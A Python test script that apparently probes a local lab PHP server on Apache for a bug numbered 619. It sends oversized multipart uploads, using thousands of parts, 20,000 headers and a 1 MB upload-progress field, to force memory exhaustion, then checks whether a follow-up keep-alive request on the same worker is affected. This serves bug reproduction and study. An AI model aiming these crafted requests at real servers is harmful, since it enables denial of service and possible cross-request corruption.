#!/usr/bin/env python3
"""619 fire at 8083: producer OOM-in-encode + consumer on SAME worker (one keep-alive
connection = same Apache prefork child). Bias oracle tracks worker identity.
Matrix: A encode-OOM -> progress consumer; B encode-OOM -> GET; C encode-OOM ->
plain multipart; D header-bloat-OOM -> progress; E progress-1MB-OOM -> progress."""
import socket, sys, time, json

HOST, PORT = "127.0.0.1", 8083
SID = "abcdef0123456789abcdef0123456789"
B = b"GLM619"

def part(name, body, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + B + b"\r\n" + d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"

def post_body(parts):
    return b"".join(parts) + b"--" + B + b"--\r\n"

def raw_request(head, body=None, timeout=120):
    """single connection request, returns raw bytes"""
    s = socket.create_connection((HOST, PORT), timeout=20)
    s.sendall(head if body is None else head + body)
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            out += d
    except socket.timeout:
        out += b"\n<TIMEOUT>"
    except ConnectionResetError:
        out += b"\n<RESET>"
    s.close()
    return out

def get_bias(timeout=30):
    r = raw_request(b"GET /lab/index.php?probe=base HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n", timeout=timeout)
    m = r.split(b"\r\n\r\n", 1)
    return (m[1] if len(m) > 1 else r)[:60]

def keepalive_seq(reqs, timeout=120):
    """reqs = list of (head, body); ONE connection; returns raw stream split"""
    s = socket.create_connection((HOST, PORT), timeout=20)
    raw = b""
    for head, body in reqs:
        s.sendall(head + body if body is not None else head)
        s.settimeout(timeout)
        try:
            while True:
                d = s.recv(65536)
                if not d:
                    raw += b"\n<EOF>"
                    break
                raw += d
                # crude content-length split: if response complete, break recv loop
                head_part, _, rest = raw.rpartition(b"\r\n\r\n")
                break
        except socket.timeout:
            raw += b"\n<TIMEOUT>"
        except ConnectionResetError:
            raw += b"\n<RESET>"
            break
    s.close()
    return raw

def post_head(blen):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\n").encode()

prog = [part(b"PHPSESSID", SID.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
        part(b"u", b"y", filename=b"a.txt")]
enc_oom = [part(b"PHPSESSID", SID.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k")]
for i in range(600):
    enc_oom.append(part(f"u{i}".encode(), b"xxxxxxxx", filename=f"f{i}.txt".encode()))
hdrs = b""
for i in range(20000):
    hdrs += f"X-{i}: v\r\n".encode()
hdr_oom = [b"--" + B + b"\r\n" + hdrs + b"Content-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n"]
bigprog = [part(b"PHPSESSID", SID.encode()),
           part(b"PHP_SESSION_UPLOAD_PROGRESS", b"K" * (1024 * 1024)),
           part(b"u", b"", filename=b"f.txt")]
plain = [part(b"a", b"1"), part(b"b", b"2")]

KA = b"Connection: keep-alive\r\n\r\n"

case = sys.argv[1]
b0 = get_bias()
print(f"[{case}] worker bias BEFORE: {b0!r}", flush=True)

if case == "A":
    pb = post_body(enc_oom)
    cb = post_body(prog)
    reqs = [(post_head(len(pb)) + KA, pb), (post_head(len(cb)) + KA, cb)]
elif case == "B":
    pb = post_body(enc_oom)
    reqs = [(post_head(len(pb)) + KA, pb),
            (b"GET /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: keep-alive\r\n\r\n", None)]
elif case == "C":
    pb = post_body(enc_oom)
    cb = post_body(plain)
    reqs = [(post_head(len(pb)) + KA, pb), (post_head(len(cb)) + KA, cb)]
elif case == "D":
    pb = post_body(hdr_oom)
    cb = post_body(prog)
    reqs = [(post_head(len(pb)) + KA, pb), (post_head(len(cb)) + KA, cb)]
elif case == "E":
    pb = post_body(bigprog)
    cb = post_body(prog)
    reqs = [(post_head(len(pb)) + KA, pb), (post_head(len(cb)) + KA, cb)]

raw = keepalive_seq(reqs)
# split responses
rs = raw.split(b"HTTP/1.1 ")
print(f"[{case}] raw stream len={len(raw)}", flush=True)
for i, r in enumerate(rs[1:], 1):
    print(f"--- resp {i}: {r[:200]!r}", flush=True)
b1 = get_bias()
print(f"[{case}] worker bias AFTER: {b1!r}", flush=True)
print(f"[{case}] SAME_WORKER={b0 == b1}", flush=True)
